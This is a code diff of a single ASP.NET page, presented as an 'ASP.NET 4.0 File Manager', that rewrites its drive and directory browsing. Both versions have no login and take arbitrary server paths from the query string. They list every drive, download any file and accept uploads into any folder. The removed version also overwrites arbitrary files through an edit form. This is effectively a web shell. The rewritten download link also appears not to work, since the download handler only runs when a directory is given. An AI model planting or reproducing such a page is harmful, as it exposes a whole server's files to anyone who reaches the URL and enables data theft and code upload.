@@ -3,113 +3,96 @@
 <%@ Import Namespace="System.Web" %>
 
 <script runat="server">
-protected void Page_Load(object sender, EventArgs e)
-{
-    string dir = Request.QueryString["dir"];
-    if (string.IsNullOrEmpty(dir))
+    protected void Page_Load(object sender, EventArgs e)
     {
-        ShowDrives();
-    }
-    else
-    {
-        ShowDirectory(dir);
-    }
-}
-
-void ShowDrives()
-{
-    Response.Write("<h2>Drives</h2><ul>");
-    DriveInfo[] drives = DriveInfo.GetDrives();
-    foreach (DriveInfo drive in drives)
-    {
-        if (drive.IsReady)
+        string dir = Request.QueryString["dir"];
+        if (string.IsNullOrEmpty(dir))
         {
-            Response.Write("<li class='dir'>[DRIVE] <a href='?dir=" + HttpUtility.UrlEncode(drive.RootDirectory.FullName) + "'>" + drive.Name + "</a></li>");
+            // Show drives
+            DriveInfo[] drives = DriveInfo.GetDrives();
+            Response.Write("<ul>");
+            foreach (DriveInfo drive in drives)
+            {
+                if (drive.IsReady)
+                {
+                    Response.Write("<li class='dir'>[DRIVE] <a href='?dir=" + 
+                        HttpUtility.UrlEncode(drive.RootDirectory.FullName) + 
+                        "'>" + drive.Name + "</a></li>");
+                }
+            }
+            Response.Write("</ul>");
+        }
+        else
+        {
+            // Show folders and files
+            DirectoryInfo di = new DirectoryInfo(dir);
+            Response.Write("<h3>Current directory: " + HttpUtility.HtmlEncode(di.FullName) + "</h3>");
+            Response.Write("<ul>");
+
+            // Parent folder link
+            if (di.Parent != null)
+            {
+                Response.Write("<li class='dir'>[PARENT] <a href='?dir=" +
+                    HttpUtility.UrlEncode(di.Parent.FullName) + "'>..</a></li>");
+            }
+
+            // Folders
+            foreach (DirectoryInfo sub in di.GetDirectories())
+            {
+                Response.Write("<li class='dir'>[DIR] <a href='?dir=" +
+                    HttpUtility.UrlEncode(sub.FullName) + "'>" + HttpUtility.HtmlEncode(sub.Name) + "</a></li>");
+            }
+
+            // Files
+            foreach (FileInfo fi in di.GetFiles())
+            {
+                Response.Write("<li class='file'>[FILE] <a href='?download=" +
+                    HttpUtility.UrlEncode(fi.FullName) + "'>" + HttpUtility.HtmlEncode(fi.Name) + "</a></li>");
+            }
+            Response.Write("</ul>");
+
+            // Upload form
+            Response.Write("<h3>Upload file</h3>");
+            Response.Write("<form method='post' enctype='multipart/form-data'>");
+            Response.Write("<input type='file' name='file' />");
+            Response.Write("<input type='submit' value='Upload' />");
+            Response.Write("</form>");
+
+            // Handle upload
+            if (IsPostBack && Request.Files.Count > 0)
+            {
+                HttpPostedFile uploaded = Request.Files[0];
+                string savePath = Path.Combine(di.FullName, Path.GetFileName(uploaded.FileName));
+                uploaded.SaveAs(savePath);
+                Response.Write("<p style='color:green;'>File uploaded: " + HttpUtility.HtmlEncode(savePath) + "</p>");
+            }
+
+            // Handle download
+            string download = Request.QueryString["download"];
+            if (!string.IsNullOrEmpty(download) && File.Exists(download))
+            {
+                Response.Clear();
+                Response.ContentType = "application/octet-stream";
+                Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(download));
+                Response.WriteFile(download);
+                Response.End();
+            }
         }
     }
-    Response.Write("</ul>");
-}
-
-void ShowDirectory(string path)
-{
-    Response.Write("<h2>Directory: " + path + "</h2>");
-    Response.Write("<a href='?dir=" + HttpUtility.UrlEncode(Path.GetDirectoryName(path)) + "'>.. Parent</a><br/><br/>");
-
-    // Folders
-    Response.Write("<ul>");
-    try
-    {
-        string[] dirs = Directory.GetDirectories(path);
-        foreach (string d in dirs)
-        {
-            Response.Write("<li class='dir'><a href='?dir=" + HttpUtility.UrlEncode(d) + "'>" + Path.GetFileName(d) + "</a></li>");
-        }
-
-        // Files
-        string[] files = Directory.GetFiles(path);
-        foreach (string f in files)
-        {
-            Response.Write("<li class='file'>" + Path.GetFileName(f) + 
-                " | <a href='?dir=" + HttpUtility.UrlEncode(path) + "&download=" + HttpUtility.UrlEncode(f) + "'>Download</a>" + 
-                " | <a href='?dir=" + HttpUtility.UrlEncode(path) + "&edit=" + HttpUtility.UrlEncode(f) + "'>Edit</a></li>");
-        }
-    }
-    catch (Exception ex)
-    {
-        Response.Write("<li style='color:red;'>Error: " + ex.Message + "</li>");
-    }
-    Response.Write("</ul>");
-
-    // Download file
-    if (!string.IsNullOrEmpty(Request.QueryString["download"]))
-    {
-        string fileToDownload = Request.QueryString["download"];
-        Response.Clear();
-        Response.ContentType = "application/octet-stream";
-        Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(fileToDownload));
-        Response.WriteFile(fileToDownload);
-        Response.End();
-    }
-
-    // Edit file
-    if (!string.IsNullOrEmpty(Request.QueryString["edit"]))
-    {
-        string fileToEdit = Request.QueryString["edit"];
-        if (Request.HttpMethod == "POST")
-        {
-            string newContent = Request.Form["content"];
-            File.WriteAllText(fileToEdit, newContent);
-            Response.Write("<p style='color:green;'>File saved!</p>");
-        }
-        string content = File.ReadAllText(fileToEdit);
-        Response.Write("<form method='post'><textarea name='content' rows='20' cols='100'>" + HttpUtility.HtmlEncode(content) + "</textarea><br/><input type='submit' value='Save'></form>");
-    }
-
-    // Upload
-    Response.Write("<h3>Upload File</h3>");
-    Response.Write("<form method='post' enctype='multipart/form-data'>");
-    Response.Write("<input type='file' name='file' /> <input type='submit' value='Upload' />");
-    Response.Write("</form>");
-
-    if (IsPostBack && Request.Files.Count > 0)
-    {
-        HttpPostedFile file = Request.Files[0];
-        string fileName = Path.GetFileName(file.FileName);
-        string savePath = Path.Combine(path, fileName);
-        file.SaveAs(savePath);
-        Response.Write("<p style='color:green;'>File uploaded: " + fileName + "</p>");
-    }
-}
 </script>
 
+<html>
+<head>
 <style>
-body { font-family: Arial; background: #f9f9f9; padding: 20px; }
-h2 { color: #333; }
-ul { list-style-type: none; padding-left: 0; }
-li.dir a { font-weight: bold; color: #2a52be; text-decoration: none; }
-li.file { color: #555; }
-textarea { width: 100%; }
+    body { font-family: Arial; background: #f7f7f7; }
+    ul { list-style: none; padding-left: 0; }
+    li.dir { color: #2a52be; }
+    li.file { color: #000; }
+    a { text-decoration: none; }
+    a:hover { text-decoration: underline; }
 </style>
-
+</head>
 <body>
+<h2>ASP.NET 4.0 File Manager</h2>
 </body>
+</html>
